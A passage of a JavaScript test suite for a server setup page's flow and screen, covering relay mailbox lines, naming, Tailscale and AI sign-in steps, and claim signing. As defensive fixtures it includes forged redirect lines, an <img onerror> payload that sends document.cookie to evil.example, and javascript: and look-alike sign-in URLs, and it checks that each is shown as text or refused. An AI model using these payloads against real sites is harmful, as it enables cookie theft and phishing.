// @ts-check
// The setup page's flow and screen against the real relay client and the real Node relay server. The box's
// offer is the one thing faked (it needs a whole daemon; core/relay/setup.test.js covers that half).
import "../../scripts/mac-test-guard.mjs";
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import * as client from "../../relay/client/setup.js";
import { createRelay } from "../../relay/node/server.js";
import * as wire from "../../core/relay/wire.js";
import { createFlow, MESSAGES, MAX_LINES, suggestName } from "./flow.js";
import { render, h } from "./ui.js";
import { signClaim } from "./claim.js";

/** A relay on a free port, and the install script's side of the mailbox (the same POSTs install-box.sh makes). */
async function world(t) {
  const relay = createRelay({});
  const base = await relay.listen();
  t.after(() => relay.close());
  const http = base.replace(/^ws/, "http");
  return {
    base,
    /** Post a line for a code, as the install script would (or as anyone who saw the code could). */
    async post(code, text, seq) {
      const c = wire.parseSetupCode(code);
      const loc = wire.setupDerive("loc", c.secret).toString("base64url");
      const body = { loc, fp: c.fp.toString("base64url"), wtok: wire.setupDerive("mbxw", c.secret).toString("base64url") };
      if (text !== null) body.line = wire.mbxSeal(c.secret, seq, text);
      const r = await fetch(`${http}/v1/setup/mbx`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });
      return r.status;
    },
  };
}
const until = async (fn, ms = 5000) => { const end = Date.now() + ms; while (Date.now() < end) { const v = fn(); if (v) return v; await new Promise(r => setTimeout(r, 15)); } throw new Error("timed out waiting"); };
const fastSleep = () => new Promise(r => setTimeout(r, 5));

/** The client with resolveSetup replaced: the box's offer appears after `after` tries (or is contested). */
const clientWith = (resolve) => ({ ...client, resolveSetup: resolve });
const offer = () => ({ offer: { relay: "ws://x", route: "r".repeat(26), box: crypto.randomBytes(32), secret: "s" }, name: "Harlow Legal server", fingerprint: "ab12 cd34", handle: null, identity: null });

test("flow: a code and its install line are made, the steps stream in as plain lines, and the box's offer means found", async t => {
  const w = await world(t);
  let tries = 0;
  const seen = [];
  const flow = createFlow({ client: clientWith(async () => { if (++tries < 3) throw Object.assign(new Error("gone"), { code: "ticket_gone" }); return offer(); }),
    relay: w.base, sleep: fastSleep, pollMs: 5, onChange: s => seen.push(s.stage) });
  await flow.begin();
  const s = flow.state;
  assert.equal(s.stage, "install");
  assert.match(s.installLine, /^curl -fsSL https:\/\/vyre\.run\/i \| VYRE_CODE=[A-Za-z0-9_-]{43} sh$/, "the variable is on sh, the reader of the script");
  assert.equal(s.code.length, 43);
  await w.post(s.code, "[1/5] Checking Docker", 0);
  await w.post(s.code, "done: Docker, Compose and the TUN device are there", 1);
  const found = await until(() => flow.state.stage === "found" && flow.state);
  assert.equal(found.box.name, "Harlow Legal server");
  assert.equal(found.box.words.length, 4);
  assert.ok(found.box.words.every(x => /^[a-z]+$/.test(x)));
  await until(() => flow.state.lines.length === 2);
  assert.deepEqual(flow.state.lines, ["[1/5] Checking Docker", "done: Docker, Compose and the TUN device are there"]);
  assert.ok(seen.indexOf("install") < seen.indexOf("found"));
  flow.stop();
});

test("flow: a forged 'Done, open https://...' line is shown as text and moves nothing", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await flow.begin();
  const code = flow.state.code;
  // Anyone who saw the code can post a well-formed line; this one says the install is over and points somewhere else.
  await w.post(code, "Done. Back to your browser. Open https://evil.example/claim?c=1 to finish", 0);
  await w.post(code, "<img src=x onerror=alert(1)><a href=\"https://evil.example\">Continue</a>", 1);
  await until(() => flow.state.lines.length === 2);
  assert.equal(flow.state.stage, "install", "no line changes where the flow is");
  assert.equal(flow.state.box, null);

  // The screen: text nodes only.
  const doc = new FakeDoc();
  const root = doc.createElement("main");
  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions: { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved() {} } });
  const text = root.textContent;
  assert.ok(text.includes("Open https://evil.example/claim?c=1 to finish"), "shown as words");
  assert.ok(text.includes("<img src=x onerror=alert(1)><a href=\"https://evil.example\">Continue</a>"), "markup is shown, not made");
  assert.equal(root.all().filter(e => e.tag === "a" || e.tag === "img").length, 0, "no link or image was made from a line");
  assert.equal(doc.innerHtmlWrites, 0);
  assert.ok(!root.all().some(e => (e.attrs.href || "").includes("evil")), "no href points at a line's address");
  flow.stop();
});

test("flow: a contested code, a bad line, and an expired hour each stop the page with the plain message", async t => {
  // Contested: the relay says two servers used the code.
  const w = await world(t);
  const contested = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("x"), { code: "contested" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await contested.begin();
  await until(() => contested.state.stage === "stopped");
  assert.equal(contested.state.error.message, "Two servers used this code. Start again.");

  // A line the page cannot verify (posted at the wrong position) stops it.
  const bad = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await bad.begin();
  await w.post(bad.state.code, "hello", 5);
  await until(() => bad.state.stage === "stopped");
  assert.equal(bad.state.error.code, "bad_line");
  assert.equal(bad.state.error.message, MESSAGES.bad_line);

  // Expired: the hour runs out.
  let clock = 1_000_000;
  const exp = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, now: () => clock,
    sleep: async ms => { clock += ms; await new Promise(r => setTimeout(r, 2)); }, pollMs: 5 });
  await exp.begin();
  await until(() => exp.state.stage === "stopped");
  assert.equal(exp.state.error.message, "This code has expired. Start again.");
  for (const f of [contested, bad, exp]) f.stop();
});

test("flow: starting again makes a new code and the old one's loops end", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await flow.begin();
  const first = flow.state.code;
  await w.post(first, "first run line", 0);
  await until(() => flow.state.lines.length === 1);
  await flow.begin();
  assert.notEqual(flow.state.code, first);
  assert.deepEqual(flow.state.lines, [], "the old run's lines are gone");
  await w.post(first, "a late line for the old code", 1);
  await new Promise(r => setTimeout(r, 120));
  assert.deepEqual(flow.state.lines, [], "nothing from the old code lands on the new run");
  flow.stop();
});

test("flow: the lines kept are capped, and each is cut to a sane length", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await flow.begin();
  const code = flow.state.code;
  for (let i = 0; i < 5; i++) await w.post(code, "x".repeat(900), i);
  await until(() => flow.state.lines.length === 5);
  assert.ok(flow.state.lines.every(l => l.length <= 400));
  assert.ok(MAX_LINES >= 100);
  flow.stop();
});

/** A fake box channel: names.check answers by a rule, names.claim by another; every call is recorded. */
function fakeBox({ check, claim, domain } = {}) {
  const calls = [];
  const ch = {
    calls, closed: false,
    async call(tool, input) {
      calls.push([tool, input]);
      if (tool === "names.check") return (check || (n => ({ name: n, valid: true, available: true, why: null, address: `${n}.vyre.run` })))(input.name);
      if (tool === "names.claim") return (claim || (n => ({ phase: "dns", address: `https://${n}.vyre.run`, recoveryCode: "abcd-efgh-jklm-npqr-stuv-wxyz-23" })))(input.name);
      if (tool === "names.domain.check") return domain(input.domain);
      throw new Error("no such tool");
    },
    close() { ch.closed = true; },
  };
  return ch;
}
/** A flow whose box offer appears at once and whose connection is `box`. */
async function foundFlow(t, box, extra = {}) {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => { if (extra.connectFails) throw new Error("no"); return box; }, signClaim, ...extra.flow });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  if (!extra.unconfirmed) flow.confirmWords();
  return flow;
}

test("naming: a first name is guessed from the server's name and checked live, and only the newest answer counts", async t => {
  assert.equal(suggestName("Harlow Legal server"), "harlow-legal-server");
  assert.equal(suggestName("  Northwind's Bakery!! "), "northwind-s-bakery");
  assert.equal(suggestName("!!!"), "");
  const box = fakeBox({ check: n => ({ name: n, valid: true, available: n !== "taken", why: n === "taken" ? "someone else has that name" : null, address: `${n}.vyre.run` }) });
  const flow = await foundFlow(t, box);
  await until(() => flow.state.channel === "ready" && flow.state.naming.check);
  assert.equal(flow.state.naming.input, "harlow-legal-server");
  assert.equal(flow.state.naming.check.available, true);
  // typing fast: three keystrokes, one check, and it is for the last one
  const before = box.calls.length;
  flow.setName("t"); flow.setName("ta"); flow.setName("taken");
  await until(() => flow.state.naming.check && flow.state.naming.check.name === "taken");
  assert.equal(box.calls.length - before, 1, "one check for three keystrokes");
  assert.equal(flow.state.naming.check.available, false);
  assert.equal(flow.state.naming.check.why, "someone else has that name");
  await flow.claim();
  assert.equal(flow.state.stage, "found", "an unavailable name is not claimed");
  assert.ok(!box.calls.some(c => c[0] === "names.claim"));
  flow.stop();
  assert.equal(box.closed, true, "the connection is closed with the page");
});

test("naming: claiming a free name shows the recovery code once, and a refusal keeps the person on the form", async t => {
  const box = fakeBox();
  const flow = await foundFlow(t, box);
  await until(() => flow.state.naming.check);
  await flow.claim();
  assert.equal(flow.state.stage, "named");
  assert.equal(flow.state.named.name, "harlow-legal-server");
  assert.equal(flow.state.named.address, "https://harlow-legal-server.vyre.run");
  assert.equal(flow.state.named.recoveryCode, "abcd-efgh-jklm-npqr-stuv-wxyz-23");
  flow.stop();

  const bad = fakeBox({ claim: () => { throw Object.assign(new Error("that name was taken a moment ago"), { code: "conflict" }); } });
  const f2 = await foundFlow(t, bad);
  await until(() => f2.state.naming.check);
  await f2.claim();
  assert.equal(f2.state.stage, "found");
  assert.equal(f2.state.naming.error, "that name was taken a moment ago");
  assert.equal(f2.state.naming.claiming, false);
  f2.stop();

  const failed = fakeBox({ claim: () => ({ phase: "failed", why: "the directory would not answer" }) });
  const f3 = await foundFlow(t, failed);
  await until(() => f3.state.naming.check);
  await f3.claim();
  assert.equal(f3.state.stage, "found");
  assert.equal(f3.state.naming.error, "the directory would not answer");
  f3.stop();
});

test("naming: a connection that cannot be opened says so in plain words", async t => {
  const flow = await foundFlow(t, fakeBox(), { connectFails: true });
  await until(() => flow.state.channel === "failed");
  assert.equal(flow.state.error.message, MESSAGES.connect);
  flow.stop();
});

test("screen: the name field keeps its element (and so its caret) while progress lines arrive, and the claim button follows the check", async t => {
  const box = fakeBox({ check: n => ({ name: n, valid: n.length > 2, available: n.length > 2, why: n.length > 2 ? null : "too short", address: `${n}.vyre.run` }) });
  const w = await world(t);
  const doc = new FakeDoc();
  const root = doc.createElement("main");
  const typed = [];
  const actions = { begin() {}, copy() {}, setName: x => typed.push(x), claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved() {} };
  const flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box,
    onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  assert.equal(root.all().find(e => e.tag === "input"), undefined, "no name form before the words are confirmed");
  const confirmBtn = root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "These match my server's terminal"));
  assert.ok(confirmBtn, "the one click is there");
  confirmBtn.listeners.click();
  await until(() => flow.state.naming.check);
  const input = () => root.all().find(e => e.tag === "input");
  const claimBtn = () => root.all().find(e => e.attrs["data-role"] === "claim");
  const first = input();
  assert.ok(first, "the form is there");
  assert.equal(claimBtn().attrs.disabled, undefined, "a free name can be claimed");
  await w.post(flow.state.code, "a late progress line", 0);
  await until(() => flow.state.lines.length === 1);
  assert.equal(input(), first, "the same input element after a progress line");
  first.listeners.input({ currentTarget: { value: "ab" } });
  assert.deepEqual(typed, ["ab"]);
  await flow.setName("ab");
  await until(() => flow.state.naming.check && flow.state.naming.check.name === "ab");
  assert.equal(input(), first, "the same input element after a check");
  assert.equal(claimBtn().attrs.disabled, "disabled", "a name that is not free cannot be claimed");
  assert.ok(root.textContent.includes("too short"));
  flow.stop();
});

test("words: nothing opens, and no name form shows, until the person says the four words match; a mismatch stops it", async t => {
  const box = fakeBox();
  let connects = 0;
  const w = await world(t);
  const mk = () => createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => { connects++; return box; } });
  const flow = mk();
  await flow.begin();
  await until(() => flow.state.stage === "found");
  assert.equal(flow.state.confirm, "pending");
  await new Promise(r => setTimeout(r, 80));
  assert.equal(connects, 0, "an offer alone opens nothing");
  assert.equal(flow.state.channel, "none");
  await flow.claim();
  assert.equal(flow.state.stage, "found");
  flow.confirmWords();
  await until(() => flow.state.channel === "ready");
  assert.equal(connects, 1);
  flow.stop();

  const other = mk();
  await other.begin();
  await until(() => other.state.stage === "found");
  other.denyWords();
  assert.equal(other.state.stage, "stopped");
  assert.equal(other.state.error.message, MESSAGES.mismatch);
  await new Promise(r => setTimeout(r, 50));
  assert.equal(connects, 1, "a mismatch never connects");
  other.stop();
});

test("recovery code: it stays until 'I saved it', the screen warns, and saving drops the code from the page", async t => {
  const flow = await foundFlow(t, fakeBox());
  await until(() => flow.state.naming.check);
  await flow.claim();
  assert.equal(flow.state.named.saved, false);
  const doc = new FakeDoc(), root = doc.createElement("main");
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved: () => flow.markSaved() };
  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions });
  assert.ok(root.textContent.includes("abcd-efgh-jklm-npqr-stuv-wxyz-23"));
  assert.ok(root.textContent.includes("clipboard"), "the clipboard-history note");
  assert.ok(root.textContent.includes("If you close it or reload before you have saved the code, it is gone."));
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "I saved it")).listeners.click();
  assert.equal(flow.state.named.saved, true);
  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions });
  assert.ok(!root.textContent.includes("abcd-efgh-jklm-npqr-stuv-wxyz-23"), "the code leaves the page once it is saved");
  flow.stop();
});

test("forged lines: an <img onerror> payload and a very long line are text, capped, and change nothing", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await flow.begin();
  const payload = `<img src=x onerror="fetch('https://evil.example/?'+document.cookie)"><script>alert(1)</script>`;
  await w.post(flow.state.code, payload, 0);
  await w.post(flow.state.code, "A".repeat(1000), 1);
  await until(() => flow.state.lines.length === 2);
  assert.equal(flow.state.stage, "install");
  assert.equal(flow.state.lines[0], payload, "kept as the words it is");
  assert.equal(flow.state.lines[1].length, 400, "a long line is cut");
  const doc = new FakeDoc(), root = doc.createElement("main");
  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions: { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved() {} } });
  assert.deepEqual(root.all().filter(e => ["img", "script", "a", "iframe"].includes(e.tag)).map(e => e.tag), [], "no element is made from a line");
  assert.ok(root.textContent.includes(payload), "the markup is shown as text");
  assert.equal(doc.innerHtmlWrites, 0);
  flow.stop();
});

/** A fake box for the later steps: Tailscale and provider sign-ins follow a script the test drives. */
function stepsBox(script = {}) {
  const box = fakeBox();
  const base = box.call;
  const st = { ts: "needs-login", kind: "personal", loginUrl: "https://login.tailscale.com/a/abc123", claimPhase: "dns", flows: {}, ...script };
  box.st = st;
  box.call = async (tool, input) => {
    if (tool === "network.tailscale.status") { box.calls.push([tool, input]); return { state: st.ts, login: "alex@example.com", tailnet: "alex.example", tailnetKind: st.kind, ip: st.ts === "connected" ? "100.64.0.9" : null }; }
    if (tool === "network.tailscale.login") { box.calls.push([tool, input]); return { loginUrl: st.loginUrl, state: "needs-login" }; }
    if (tool === "names.claim" && st.claimPhase) { box.calls.push([tool, input]); return { phase: st.claimPhase, address: "https://harlow-legal-server.vyre.run", recoveryCode: st.ts === "connected" ? null : "abcd-efgh-jklm-npqr-stuv-wxyz-23" }; }
    if (tool === "sessions.accounts.signin") {
      box.calls.push([tool, input]);
      if (input.provider) { const flow = `f-${input.provider}`; st.flows[flow] = { provider: input.provider, polls: 0 }; return input.provider === "claude" ? { flow, step: "url", url: "https://claude.ai/oauth/authorize?x=1", paste: true } : { flow, step: "code", url: "https://example.org/device", code: "WXYZ-1234" }; }
      const f = st.flows[input.flow];
      if (input.code) { f.done = input.code === "good-code"; return f.done ? { step: "waiting" } : { step: "failed", message: "Claude said that code has expired" }; }
      if (f.failStatus) return { flow: input.flow, step: "failed", provider: f.provider, message: "the sign-in page was closed before it finished" };
      f.polls++;
      return f.provider === "claude" ? { step: f.done ? "done" : "url" } : { step: f.polls >= 2 ? "done" : "code" };
    }
    if (tool === "sessions.accounts.key") {
      box.calls.push([tool, input]);
      if (input.key === "sk-refused-key-123456") throw new Error("the service refused that key: sk-refused-key-123456");
      return { account: "acct1", provider: input.kind, checked: true };
    }
    if (tool === "names.status") { box.calls.push([tool, input]); if (!st.namesPhase) throw Object.assign(new Error("no such tool"), { status: 404 }); return { name: "harlow-legal-server", phase: st.namesPhase, why: st.namesWhy || null }; }
    if (tool === "relay.setup.claim-token") { box.calls.push([tool, input]); if (st.claimFails) throw new Error("this setup session has ended"); return { challenge: crypto.randomBytes(32).toString("base64url"), exp: Date.now() + (st.claimMs ?? 120_000), route: "r".repeat(26) }; }
    if (tool === "relay.pair.ticket") { box.calls.push([tool, input]); if (st.ticketMade) throw Object.assign(new Error("the setup page has already made its one pairing ticket"), { code: "denied" }); st.ticketMade = true; return { ticket: "AAECAwQFBgc", expiresAt: Date.now() + (st.ticketMs ?? 300_000), connected: true }; }
    return base(tool, input);
  };
  box.events = async (type, since) => { box.calls.push(["events", { type, since }]); return [...(st.paired || []), ...(st.events || [])].filter(e => e.type === type && e.id > since); };
  return box;
}
async function atNamed(t, box) {
  const flow = await foundFlow(t, box);
  await until(() => flow.state.naming.check);
  await flow.claim();
  flow.markSaved();
  return flow;
}

/** Through Tailscale (connected, address live) to the AI step. */
async function toAi(flow, box) {
  flow.continueToTailscale();
  box.st.ts = "connected"; box.st.claimPhase = "serving";
  await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "serving");
  flow.continueToAi();
}

test("steps: Tailscale comes before the AI sign-in, one done login is needed to go on, and a pasted code finishes the ones that want it", async t => {
  const box = stepsBox();
  const flow = await atNamed(t, box);
  flow.continueToAi();
  assert.equal(flow.state.stage, "named", "the AI step is not reachable from the naming screen");
  flow.continueToTailscale();
  assert.equal(flow.state.stage, "tailscale");
  flow.continueToAi();
  assert.equal(flow.state.stage, "tailscale", "the address is not live yet");
  await toAi(flow, box);
  assert.equal(flow.state.stage, "ai");
  flow.continueToDevices();
  assert.equal(flow.state.stage, "ai", "no login is done yet");

  flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].code === "WXYZ-1234");
  assert.equal(flow.state.ai.accounts[0].url, "https://example.org/device");
  await until(() => flow.state.ai.accounts[0].step === "done");
  assert.ok(box.calls.some(c => c[0] === "sessions.accounts.signin" && c[1].flow === "f-codex"), "it polled with the flow");

  flow.startAi("claude");
  await until(() => flow.state.ai.accounts.find(a => a.provider === "claude" && a.step === "url"));
  const claude = () => flow.state.ai.accounts.find(a => a.provider === "claude");
  assert.equal(claude().paste, true);
  await flow.submitAiCode(claude().id, "bad-code");
  assert.equal(claude().step, "failed");
  assert.equal(claude().error, "Claude said that code has expired", "the box's own words (core/sessions/signin.js answers `message`), not a generic line");
  flow.startAi("claude");
  await until(() => flow.state.ai.accounts.filter(a => a.provider === "claude").some(a => a.step === "url"));
  const again = flow.state.ai.accounts.find(a => a.provider === "claude" && a.step === "url");
  await flow.submitAiCode(again.id, "good-code");
  await until(() => flow.state.ai.accounts.find(a => a.id === again.id).step === "done");
  flow.continueToDevices();
  assert.equal(flow.state.stage, "devices");
  flow.stop();
});

test("steps: a sign-in link that is not a plain https address is not shown", async t => {
  const box = stepsBox();
  const orig = box.call;
  box.call = async (tool, input) => { const r = await orig(tool, input); return tool === "sessions.accounts.signin" && input.provider ? { ...r, url: "javascript:alert(1)" } : r; };
  const flow = await atNamed(t, box);
  await toAi(flow, box);
  flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].error);
  assert.equal(flow.state.ai.accounts[0].url, null);
  assert.match(flow.state.ai.accounts[0].error, /not a plain https address/);
  flow.stop();
});

test("steps: Tailscale shows a checked sign-in link, waits for the join, then publishes the address once and stops", async t => {
  const box = stepsBox();
  const flow = await atNamed(t, box);
  flow.continueToTailscale();
  await until(() => flow.state.tailscale.status);
  assert.equal(flow.state.tailscale.status.state, "needs-login");
  await flow.connectTailscale();
  assert.equal(flow.state.tailscale.loginUrl, "https://login.tailscale.com/a/abc123");
  box.st.ts = "connected"; box.st.claimPhase = "serving";
  await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "serving");
  const claims = box.calls.filter(c => c[0] === "names.claim").length;
  await new Promise(r => setTimeout(r, 60));
  assert.equal(box.calls.filter(c => c[0] === "names.claim").length, claims, "no more claims once it is serving");
  assert.equal(flow.state.tailscale.loginUrl, null, "the link is dropped once connected");
  flow.stop();

  // Not Tailscale's page: refused.
  const bad = stepsBox({ loginUrl: "https://evil.example/login" });
  const f2 = await atNamed(t, bad);
  f2.continueToTailscale();
  await f2.connectTailscale();
  assert.equal(f2.state.tailscale.loginUrl, null);
  assert.match(f2.state.tailscale.error, /not Tailscale's/);
  f2.stop();
});

test("steps: the screens render, links are real https anchors only where the box's link was checked, and the pasted-code field keeps its element", async t => {
  const box = stepsBox({ ts: "connected", kind: "organization", claimPhase: "certificate" });
  const doc = new FakeDoc(), root = doc.createElement("main");
  let flow;
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved: () => flow.markSaved(),
    continueToAi: () => flow.continueToAi(), continueToTailscale: () => flow.continueToTailscale(), connectTailscale: () => flow.connectTailscale(), startAi: p => flow.startAi(p), submitAiCode: (i, c) => flow.submitAiCode(i, c) };
  const w = await world(t);
  flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box,
    onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  flow.confirmWords();
  await until(() => flow.state.naming.check);
  await flow.claim(); flow.markSaved(); flow.continueToTailscale();
  await until(() => flow.state.tailscale.address);
  assert.ok(root.textContent.includes("This is a work network"), "the work-network warning");
  assert.ok(root.textContent.includes("Publishing your address"));
  box.st.namesPhase = "serving";
  await until(() => flow.state.tailscale.address.phase === "serving");
  flow.continueToAi();
  flow.startAi("claude");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "url");
  const anchors = () => root.all().filter(e => e.tag === "a");
  assert.deepEqual(anchors().map(a => a.attrs.href), ["https://claude.ai/oauth/authorize?x=1"]);
  assert.ok(anchors().every(a => a.attrs.rel.includes("noopener") && a.attrs.target === "_blank"));
  const field = () => root.all().find(e => e.tag === "input" && e.attrs.name === "code");
  const first = field();
  assert.ok(first);
  await w.post(flow.state.code, "a progress line while the code is being typed", 0);
  await until(() => flow.state.lines.length === 1);
  assert.equal(field(), first, "the same field after a progress line");
  first.value = "good-code";
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Finish")).listeners.click();
  await until(() => flow.state.ai.accounts[0].step === "done");
  flow.stop();
});

async function atDevices(t, box, extra = {}) {
  const flow = await atNamed(t, box);
  await toAi(flow, box);
  flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "done");
  flow.continueToDevices();
  return flow;
}

test("devices: the page makes no pairing ticket (one pairing path: the install terminal's); asking for a phone does nothing and the page moves on", async t => {
  const box = stepsBox();
  const flow = await atDevices(t, box);
  assert.equal(flow.state.stage, "devices");
  assert.equal(flow.currentTicket(), null);
  await flow.addPhone();
  assert.equal(flow.state.devices.phone, "idle", "nothing was started");
  assert.equal(box.calls.filter(c => c[0] === "relay.pair.ticket").length, 0, "the page never asks the box for a pairing ticket");
  flow.continueToClaim();
  assert.equal(flow.state.stage, "claim");
  flow.stop();
});

test("devices: the screen draws the ring into its slot only while showing, and never prints the ticket", async t => {
  const box = stepsBox();
  const doc = new FakeDoc(), root = doc.createElement("main");
  const drawn = [];
  let flow;
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved: () => flow.markSaved(),
    continueToAi: () => flow.continueToAi(), continueToTailscale: () => flow.continueToTailscale(), connectTailscale() {}, startAi: p => flow.startAi(p), submitAiCode() {},
    continueToDevices: () => flow.continueToDevices(), addPhone: () => flow.addPhone(), drawRing: slot => drawn.push(slot.attrs["data-role"]), continueToClaim() {}, mintClaim() {}, drawQr() {} };
  const w = await world(t);
  flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box,
    onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  flow.confirmWords();
  await until(() => flow.state.naming.check);
  await flow.claim(); flow.markSaved(); flow.continueToTailscale();
  box.st.ts = "connected"; box.st.claimPhase = "serving";
  await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "serving");
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Continue")).listeners.click();
  assert.equal(flow.state.stage, "ai");
  flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "done");
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Continue")).listeners.click();
  assert.equal(flow.state.stage, "devices");
  assert.deepEqual(drawn, []);
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Add my phone")).listeners.click();
  await until(() => drawn.length === 1);
  assert.deepEqual(drawn, ["ring"]);
  assert.ok(!root.textContent.includes("AAECAwQFBgc"), "the ticket is not printed");
  await new Promise(r => setTimeout(r, 40));
  assert.equal(drawn.length, 1, "drawn once, not on every poll");
  flow.stop();
});

test("site: the phone's ring is plain SVG shapes: no script, style, link or handler for the page's CSP to refuse", async () => {
  const { ticketRingSvg } = await import("../../web/js/phone-code.js");
  const svg = ticketRingSvg("AAECAwQFBgc", { size: 280 });
  assert.ok(svg.startsWith("<svg"));
  assert.ok(!/<script|<style|style=|href=|xlink|on\w+=/i.test(svg));
});

test("tailscale: with the box's event stream it reads status when told, not on a clock; a broken stream falls back to a capped poll that stops on an error", async t => {
  const box = stepsBox();
  let poke = () => {}, endStream = () => {};
  let followed = 0;
  box.follow = (type, onEvent, onEnd) => { followed++; assert.equal(type, "tailscale.changed"); poke = () => onEvent({ type }); endStream = err => onEnd(err); return () => {}; };
  const flow = await atNamed(t, box);
  flow.continueToTailscale();
  await until(() => flow.state.tailscale.status && followed === 1);
  const statusCalls = () => box.calls.filter(c => c[0] === "network.tailscale.status").length;
  const first = statusCalls();
  await new Promise(r => setTimeout(r, 120));
  assert.equal(statusCalls(), first, "nothing reads status while the box is quiet");
  box.st.ts = "connected"; box.st.claimPhase = "serving";
  poke();
  await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "serving");
  assert.ok(statusCalls() > first, "an event was a reason to read");
  flow.stop();

  // The stream breaks: the capped poll takes over, and an error from the box ends the watching.
  const b2 = stepsBox();
  b2.follow = (type, onEvent, onEnd) => { setTimeout(() => onEnd(new Error("stream broke")), 10); return () => {}; };
  const f2 = await atNamed(t, b2);
  f2.continueToTailscale();
  await until(() => b2.calls.filter(c => c[0] === "network.tailscale.status").length >= 3);
  const orig = b2.call;
  b2.call = async (tool, input) => { if (tool === "network.tailscale.status") throw Object.assign(new Error("this setup session has ended"), { code: "setup_over", status: 401 }); return orig(tool, input); };
  await until(() => f2.state.tailscale.error);
  const n = b2.calls.length;
  await new Promise(r => setTimeout(r, 80));
  assert.equal(b2.calls.length, n, "no more calls after the error");
  f2.stop();
});

test("ai: with a list of provider hosts, a sign-in link elsewhere is refused", async t => {
  const box = stepsBox();
  const flow = await foundFlow(t, box, { flow: { signinHosts: ["example.org", "claude.ai"] } });
  await until(() => flow.state.naming.check);
  await flow.claim(); flow.markSaved();
  await toAi(flow, box);
  flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "done");
  assert.equal(flow.state.ai.accounts[0].error, null);
  const orig = box.call;
  box.call = async (tool, input) => { const r = await orig(tool, input); return tool === "sessions.accounts.signin" && input.provider === "grok" ? { ...r, url: "https://login.evil.example/x" } : r; };
  flow.startAi("grok");
  await until(() => flow.state.ai.accounts.find(a => a.provider === "grok" && a.error));
  assert.equal(flow.state.ai.accounts.find(a => a.provider === "grok").step, "failed");
  flow.stop();
});

test("claim: the token is the box's challenge signed by the page key over its route and the exact address, and only that key's signature verifies", async () => {
  const key = await client.createSetupKey();
  const challenge = crypto.randomBytes(32).toString("base64url");
  const route = "r".repeat(26);
  const token = await signClaim({ privateKey: key.privateKey, route, challenge, host: "harlow.vyre.run" });
  const raw = Buffer.from(token, "base64url");
  assert.equal(raw.length, 96, "32 bytes of challenge and a 64-byte signature");
  assert.deepEqual(raw.subarray(0, 32), Buffer.from(challenge, "base64url"));
  const pub = crypto.createPublicKey({ key: Buffer.from(key.spki), format: "der", type: "spki" });
